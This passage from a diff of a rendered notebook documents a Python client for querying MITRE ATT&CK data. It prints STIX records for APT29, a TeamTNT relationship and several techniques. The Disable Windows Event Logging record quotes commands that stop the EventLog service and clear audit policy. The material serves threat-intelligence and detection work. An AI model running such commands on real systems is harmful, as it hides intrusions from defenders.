Europe, Asia, and the Middle East. Industry reporting referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, and Dark Halo.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP May 2021)&quot;, aliases=[&#39;APT29&#39;, &#39;NobleBaron&#39;, &#39;Dark Halo&#39;, &#39;StellarParticle&#39;, &#39;NOBELIUM&#39;, &#39;UNC2452&#39;, &#39;YTTRIUM&#39;, &#39;The Dukes&#39;, &#39;Cozy Bear&#39;, &#39;CozyDuke&#39;], revoked=False, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/groups/G0016&#39;, external_id=&#39;G0016&#39;), ExternalReference(source_name=&#39;APT29&#39;, description=&#39;(Citation: F-Secure The Dukes)(Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)&#39;), ExternalReference(source_name=&#39;NobleBaron&#39;, description=&#39;(Citation: SentinelOne NobleBaron June 2021)&#39;), ExternalReference(source_name=&#39;Dark Halo&#39;, description=&#39;(Citation: Volexity SolarWinds)&#39;), ExternalReference(source_name=&#39;StellarParticle&#39;, description=&#39;(Citation: CrowdStrike SUNSPOT Implant January 2021)&#39;), ExternalReference(source_name=&#39;NOBELIUM&#39;, description=&#39;(Citation: MSTIC NOBELIUM Mar 2021)(Citation: MSTIC NOBELIUM May 2021)(Citation: MSTIC Nobelium Toolset May 2021)(Citation: MSRC Nobelium June 2021)&#39;), ExternalReference(source_name=&#39;UNC2452&#39;, description=&#39;(Citation: FireEye SUNBURST Backdoor December 2020)&#39;), ExternalReference(source_name=&#39;YTTRIUM&#39;, description=&#39;(Citation: Microsoft Unidentified Dec 2018)&#39;), ExternalReference(source_name=&#39;The Dukes&#39;, description=&#39;(Citation: F-Secure The Dukes)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)&#39;), ExternalReference(source_name=&#39;Cozy Bear&#39;, description=&#39;(Citation: Crowdstrike DNC June 2016)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)&#39;), ExternalReference(source_name=&#39;CozyDuke&#39;, description=&#39;(Citation: Crowdstrike DNC June 2016)&#39;), ExternalReference(source_name=&#39;White House Imposing Costs RU Gov April 2021&#39;, description=&#39;White House. (2021, April 15). Imposing Costs for Harmful Foreign Activities by the Russian Government. Retrieved April 16, 2021.&#39;, url=&#39;https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/15/fact-sheet-imposing-costs-for-harmful-foreign-activities-by-the-russian-government/&#39;), ExternalReference(source_name=&#39;UK Gov Malign RIS Activity April 2021&#39;, description=&#39;UK Gov. (2021, April 15). UK and US expose global campaign of malign activity by Russian intelligence services . Retrieved April 16, 2021.&#39;, url=&#39;https://www.gov.uk/government/news/russia-uk-and-us-expose-global-campaigns-of-malign-activity-by-russian-intelligence-services&#39;), ExternalReference(source_name=&#39;F-Secure The Dukes&#39;, description=&#39;F-Secure Labs. (2015, September 17). The Dukes: 7 years of Russian cyberespionage. Retrieved December 10, 2015.&#39;, url=&#39;https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf&#39;), ExternalReference(source_name=&#39;GRIZZLY STEPPE JAR&#39;, description=&#39;Department of Homeland Security and Federal Bureau of Investigation. (2016, December 29). GRIZZLY STEPPE – Russian Malicious Cyber Activity. Retrieved January 11, 2017.&#39;, url=&#39;https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf&#39;), ExternalReference(source_name=&#39;Crowdstrike DNC June 2016&#39;, description=&#39;Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016.&#39;, url=&#39;https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/&#39;), ExternalReference(source_name=&#39;UK Gov UK Exposes Russia SolarWinds April 2021&#39;, description=&#39;UK Gov. (2021, April 15). UK exposes Russian involvement in SolarWinds cyber compromise . Retrieved April 16, 2021.&#39;, url=&#39;https://www.gov.uk/government/news/russia-uk-exposes-russian-involvement-in-solarwinds-cyber-compromise&#39;), ExternalReference(source_name=&#39;NSA Joint Advisory SVR SolarWinds April 2021&#39;, description=&#39;NSA, FBI, DHS. (2021, April 15). Russian SVR Targets U.S. and Allied Networks. Retrieved April 16, 2021.&#39;, url=&#39;https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF&#39;), ExternalReference(source_name=&#39;UK NSCS Russia SolarWinds April 2021&#39;, description=&#39;UK NCSC. (2021, April 15). UK and US call out Russia for SolarWinds compromise. Retrieved April 16, 2021.&#39;, url=&#39;https://www.ncsc.gov.uk/news/uk-and-us-call-out-russia-for-solarwinds-compromise&#39;), ExternalReference(source_name=&#39;FireEye SUNBURST Backdoor December 2020&#39;, description=&#39;FireEye. (2020, December 13). Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor. Retrieved January 4, 2021.&#39;, url=&#39;https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html&#39;), ExternalReference(source_name=&#39;MSTIC NOBELIUM Mar 2021&#39;, description=&#39;Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021.&#39;, url=&#39;https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/&#39;), ExternalReference(source_name=&#39;CrowdStrike SUNSPOT Implant January 2021&#39;, description=&#39;CrowdStrike Intelligence Team. (2021, January 11). SUNSPOT: An Implant in the Build Process. Retrieved January 11, 2021.&#39;, url=&#39;https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/&#39;), ExternalReference(source_name=&#39;Volexity SolarWinds&#39;, description=&#39;Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020.&#39;, url=&#39;https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/&#39;), ExternalReference(source_name=&#39;Cybersecurity Advisory SVR TTP May 2021&#39;, description=&#39;NCSC, CISA, FBI, NSA. (2021, May 7). Further TTPs associated with SVR cyber actors. Retrieved July 29, 2021.&#39;, url=&#39;https://www.ncsc.gov.uk/files/Advisory-further-TTPs-associated-with-SVR-cyber-actors.pdf&#39;), ExternalReference(source_name=&#39;FireEye APT29 Nov 2018&#39;, description=&#39;Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018.&#39;, url=&#39;https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html&#39;), ExternalReference(source_name=&#39;ESET Dukes October 2019&#39;, description=&#39;Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020.&#39;, url=&#39;https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf&#39;), ExternalReference(source_name=&#39;NCSC APT29 July 2020&#39;, description=&#39;National Cyber Security Centre. (2020, July 16). Advisory: APT29 targets COVID-19 vaccine development. Retrieved September 29, 2020.&#39;, url=&#39;https://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development-V1-1.pdf&#39;), ExternalReference(source_name=&#39;SentinelOne NobleBaron June 2021&#39;, description=&#39;Guerrero-Saade, J. (2021, June 1). NobleBaron | New Poisoned Installers Could Be Used In Supply Chain Attacks. Retrieved August 4, 2021.&#39;, url=&#39;https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/&#39;), ExternalReference(source_name=&#39;MSTIC NOBELIUM May 2021&#39;, description=&#39;Microsoft Threat Intelligence Center (MSTIC). (2021, May 27). New sophisticated email-based attack from NOBELIUM. Retrieved May 28, 2021.&#39;, url=&#39;https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/&#39;), ExternalReference(source_name=&#39;MSTIC Nobelium Toolset May 2021&#39;, description=&#39;MSTIC. (2021, May 28). Breaking down NOBELIUM’s latest early-stage toolset. Retrieved August 4, 2021.&#39;, url=&#39;https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/&#39;), ExternalReference(source_name=&#39;MSRC Nobelium June 2021&#39;, description=&#39;MSRC. (2021, June 25). New Nobelium activity. Retrieved August 4, 2021.&#39;, url=&#39;https://msrc-blog.microsoft.com/2021/06/25/new-nobelium-activity/&#39;), ExternalReference(source_name=&#39;Microsoft Unidentified Dec 2018&#39;, description=&#39;Microsoft Defender Research Team. (2018, December 3). Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers. Retrieved April 15, 2019.&#39;, url=&#39;https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_contributors=[&#39;Daniyal Naeem, BT Security&#39;, &#39;Matt Brenton, Zurich Insurance Group&#39;, &#39;Katie Nickels, Red Canary&#39;], x_mitre_version=&#39;2.1&#39;)]
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-relationships-by-any-object-taxii">
+<h2>Get Relationships by Any Object (TAXII)<a class="headerlink" href="#get-relationships-by-any-object-taxii" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>You can get available relationships defined in ATT&amp;CK of type <strong>uses</strong> and <strong>mitigates</strong> for specific objects across all the matrices.</p></li>
+</ul>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">groups</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_groups</span><span class="p">()</span>
+<span class="n">one_group</span> <span class="o">=</span> <span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">relationships</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_relationships_by_object</span><span class="p">(</span><span class="n">one_group</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">relationships</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Relationship(type=&#39;relationship&#39;, id=&#39;relationship--6bbd0299-4e8b-4d31-83c4-c690e43294c0&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2021-10-15T18:47:18.472Z&#39;, modified=&#39;2021-10-15T18:47:18.472Z&#39;, relationship_type=&#39;uses&#39;, description=&#39;[TeamTNT](https://attack.mitre.org/groups/G0139) has searched for unsecured SSH keys.(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Trend Micro TeamTNT)&#39;, source_ref=&#39;intrusion-set--35d1b3be-49d4-42f1-aaa6-ef159c880bca&#39;, target_ref=&#39;attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf&#39;, revoked=False, external_references=[ExternalReference(source_name=&#39;Cado Security TeamTNT Worm August 2020&#39;, description=&#39;Cado Security. (2020, August 16). Team TNT – The First Crypto-Mining Worm to Steal AWS Credentials. Retrieved September 22, 2021.&#39;, url=&#39;https://www.cadosecurity.com/team-tnt-the-first-crypto-mining-worm-to-steal-aws-credentials/&#39;), ExternalReference(source_name=&#39;Trend Micro TeamTNT&#39;, description=&#39;Fiser, D. Oliveira, A. (n.d.). Tracking the Activities of TeamTNT A Closer Look at a Cloud-Focused Malicious Actor Group. Retrieved September 22, 2021.&#39;, url=&#39;https://documents.trendmicro.com/assets/white_papers/wp-tracking-the-activities-of-teamTNT.pdf&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;])
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-all-techniques-with-mitigations-taxii">
+<h2>Get All Techniques with Mitigations (TAXII)<a class="headerlink" href="#get-all-techniques-with-mitigations-taxii" title="Permalink to this headline">¶</a></h2>
+<p>The difference with this function and <strong>get_techniques()</strong> is that <strong>get_techniques_mitigated_by_mitigation</strong> returns techniques that have mitigations mapped to them.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">techniques_mitigated</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_techniques_mitigated_by_mitigations</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">len</span><span class="p">(</span><span class="n">techniques_mitigated</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>661
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">techniques_mitigated</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2021-10-12T20:02:31.866Z&#39;, modified=&#39;2021-10-16T01:50:40.276Z&#39;, name=&#39;Resource Forking&#39;, description=&#39;Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using &lt;code&gt;ls -l@&lt;/code&gt; or &lt;code&gt;xattr -l&lt;/code&gt; commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the &lt;code&gt;/Resources&lt;/code&gt; folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)&#39;, kill_chain_phases=[KillChainPhase(kill_chain_name=&#39;mitre-attack&#39;, phase_name=&#39;defense-evasion&#39;)], revoked=False, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1564/009&#39;, external_id=&#39;T1564.009&#39;), ExternalReference(source_name=&#39;macOS Hierarchical File System Overview&#39;, description=&#39;Tenon. (n.d.). Retrieved October 12, 2021.&#39;, url=&#39;http://tenon.com/products/codebuilder/User_Guide/6_File_Systems.html#anchor520553&#39;), ExternalReference(source_name=&#39;Resource and Data Forks&#39;, description=&#39;Flylib. (n.d.). Identifying Resource and Data Forks. Retrieved October 12, 2021.&#39;, url=&#39;https://flylib.com/books/en/4.395.1.192/1/&#39;), ExternalReference(source_name=&#39;ELC Extended Attributes&#39;, description=&quot;Howard Oakley. (2020, October 24). There&#39;s more to files than data: Extended Attributes. Retrieved October 12, 2021.&quot;, url=&#39;https://eclecticlight.co/2020/10/24/theres-more-to-files-than-data-extended-attributes/&#39;), ExternalReference(source_name=&#39;sentinellabs resource named fork 2020&#39;, description=&#39;Phil Stokes. (2020, November 5). Resourceful macOS Malware Hides in Named Fork. Retrieved October 12, 2021.&#39;, url=&#39;https://www.sentinelone.com/labs/resourceful-macos-malware-hides-in-named-fork/&#39;), ExternalReference(source_name=&#39;tau bundlore erika noerenberg 2020&#39;, description=&#39;Erika Noerenberg. (2020, June 29). TAU Threat Analysis: Bundlore (macOS) mm-install-macos. Retrieved October 12, 2021.&#39;, url=&#39;https://blogs.vmware.com/security/2020/06/tau-threat-analysis-bundlore-macos-mm-install-macos.html&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_contributors=[&#39;Jaron Bradley @jbradley89&#39;, &#39;Ivan Sinyakov&#39;], x_mitre_data_sources=[&#39;File: File Creation&#39;, &#39;Process: Process Creation&#39;, &#39;File: File Metadata&#39;, &#39;Command: Command Execution&#39;], x_mitre_defense_bypassed=[&#39;Notarization; Gatekeeper&#39;], x_mitre_detection=&#39;Identify files with the &lt;code&gt;com.apple.ResourceFork&lt;/code&gt; extended attribute and large data amounts stored in resource forks. \n\nMonitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. &#39;, x_mitre_is_subtechnique=True, x_mitre_permissions_required=[&#39;User&#39;], x_mitre_platforms=[&#39;macOS&#39;], x_mitre_version=&#39;1.0&#39;)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-techniques-used-by-software-taxii">
+<h2>Get Techniques Used by Software (TAXII)<a class="headerlink" href="#get-techniques-used-by-software-taxii" title="Permalink to this headline">¶</a></h2>
+<p>This the function returns information about a specific software STIX object.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">all_software</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_software</span><span class="p">()</span>
+<span class="n">one_software</span> <span class="o">=</span> <span class="n">all_software</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">software_techniques</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_techniques_used_by_software</span><span class="p">(</span><span class="n">one_software</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">software_techniques</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2020-02-21T20:46:36.688Z&#39;, modified=&#39;2021-10-19T13:37:30.534Z&#39;, name=&#39;Disable Windows Event Logging&#39;, description=&#39;Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to &lt;code&gt;Security Settings\\Local Policies\\Audit Policy&lt;/code&gt; for basic audit policy settings or &lt;code&gt;Security Settings\\Advanced Audit Policy Configuration&lt;/code&gt; for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) &lt;code&gt;auditpol.exe&lt;/code&gt; may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: &lt;code&gt;Stop-Service -Name EventLog&lt;/code&gt;.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use &lt;code&gt;auditpol&lt;/code&gt; and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the &lt;code&gt;/success&lt;/code&gt; or &lt;code&gt;/failure&lt;/code&gt; parameters. For example, &lt;code&gt;auditpol /set /category:”Account Logon” /success:disable /failure:disable&lt;/code&gt; turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: &lt;code&gt;auditpol /clear /y&lt;/code&gt; or &lt;code&gt;auditpol /remove /allusers&lt;/code&gt;.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.&#39;, kill_chain_phases=[KillChainPhase(kill_chain_name=&#39;mitre-attack&#39;, phase_name=&#39;defense-evasion&#39;)], revoked=False, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1562/002&#39;, external_id=&#39;T1562.002&#39;), ExternalReference(source_name=&#39;Windows Log Events&#39;, description=&#39;Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020.&#39;, url=&#39;https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/&#39;), ExternalReference(source_name=&#39;EventLog_Core_Technologies&#39;, description=&#39;Core Technologies. (2021, May 24). Essential Windows Services: EventLog / Windows Event Log. Retrieved September 14, 2021.&#39;, url=&#39;https://www.coretechnologies.com/blog/windows-services/eventlog/&#39;), ExternalReference(source_name=&#39;Audit_Policy_Microsoft&#39;, description=&#39;Daniel Simpson. (2017, April 19). Audit Policy. Retrieved September 13, 2021.&#39;, url=&#39;https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy&#39;), ExternalReference(source_name=&#39;Advanced_sec_audit_policy_settings&#39;, description=&#39;Simpson, D. et al. (2017, April 19). Advanced security audit policy settings. Retrieved September 14, 2021.&#39;, url=&#39;https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings&#39;), ExternalReference(source_name=&#39;auditpol&#39;, description=&#39;Jason Gerend, et al. (2017, October 16). auditpol. Retrieved September 1, 2021.&#39;, url=&#39;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol&#39;), ExternalReference(source_name=&#39;Disable_Win_Event_Logging&#39;, description=&#39; dmcxblue. (n.d.). Disable Windows Event Logging. Retrieved September 10, 2021.&#39;, url=&#39;https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging&#39;), ExternalReference(source_name=&#39;auditpol.exe_STRONTIC&#39;, description=&#39;STRONTIC. (n.d.). auditpol.exe. Retrieved September 9, 2021.&#39;, url=&#39;https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html&#39;), ExternalReference(source_name=&#39;T1562.002_redcanaryco&#39;, description=&#39;redcanaryco. (2021, September 3). T1562.002 - Disable Windows Event Logging. Retrieved September 13, 2021.&#39;, url=&#39;https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md&#39;), ExternalReference(source_name=&#39;def_ev_win_event_logging&#39;, description=&#39;Chandel, R. (2021, April 22). Defense Evasion: Windows Event Logging (T1562.002). Retrieved September 14, 2021.&#39;, url=&#39;https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/&#39;), ExternalReference(source_name=&#39;evt_log_tampering&#39;, description=&#39;svch0st. (2020, September 30). Event Log Tampering Part 1: Disrupting the EventLog Service. Retrieved September 14, 2021.&#39;, url=&#39;https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_contributors=[&#39;Prasanth Sadanala, Cigna Information Protection (CIP) - Threat Response Engineering Team&#39;], x_mitre_data_sources=[&#39;Process: Process Creation&#39;, &#39;Script: Script Execution&#39;, &#39;Windows Registry: Windows Registry Key Creation&#39;, &#39;Application Log: Application Log Content&#39;, &#39;Sensor Health: Host Status&#39;, &#39;Command: Command Execution&#39;], x_mitre_defense_bypassed=[&#39;Log analysis&#39;], x_mitre_detection=&#39;Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  \n\nIn Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\n\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)&#39;, x_mitre_is_subtechnique=True, x_mitre_permissions_required=[&#39;Administrator&#39;], x_mitre_platforms=[&#39;Windows&#39;], x_mitre_version=&#39;1.1&#39;)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-techniques-used-by-group-taxii">
+<h2>Get Techniques Used by Group (TAXII)<a class="headerlink" href="#get-techniques-used-by-group-taxii" title="Permalink to this headline">¶</a></h2>
+<p>If you do not provide the name of a specific <strong>Group</strong> (Case Sensitive), the function returns information about all the groups available across all the matrices.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">groups</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_groups</span><span class="p">()</span>
+<span class="n">one_group</span> <span class="o">=</span> <span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">group_techniques</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_techniques_used_by_group</span><span class="p">(</span><span class="n">one_group</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">group_techniques</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2021-03-31T14:26:00.848Z&#39;, modified=&#39;2021-04-12T18:22:05.737Z&#39;, name=&#39;Container and Resource Discovery&#39;, description=&#39;Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. &#39;, kill_chain_phases=[KillChainPhase(kill_chain_name=&#39;mitre-attack&#39;, phase_name=&#39;discovery&#39;)], revoked=False, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1613&#39;, external_id=&#39;T1613&#39;), ExternalReference(source_name=&#39;Docker API&#39;, description=&#39;Docker. (n.d.). Docker Engine API v1.41 Reference. Retrieved March 31, 2021.&#39;, url=&#39;https://docs.docker.com/engine/api/v1.41/&#39;), ExternalReference(source_name=&#39;Kubernetes API&#39;, description=&#39;The Kubernetes Authors. (n.d.). The Kubernetes API. Retrieved March 29, 2021.&#39;, url=&#39;https://kubernetes.io/docs/concepts/overview/kubernetes-api/&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_contributors=[&#39;Vishwas Manral, McAfee&#39;, &#39;Center for Threat-Informed Defense (CTID)&#39;, &#39;Yossi Weizman, Azure Defender Research Team&#39;], x_mitre_data_sources=[&#39;Cluster: Cluster Metadata&#39;, &#39;Container: Container Enumeration&#39;, &#39;Container: Container Metadata&#39;, &#39;Pod: Pod Enumeration&#39;, &#39;Pod: Pod Metadata&#39;, &#39;Application Log: Application Log Content&#39;], x_mitre_detection=&#39;Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.\n\nMonitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. &#39;, 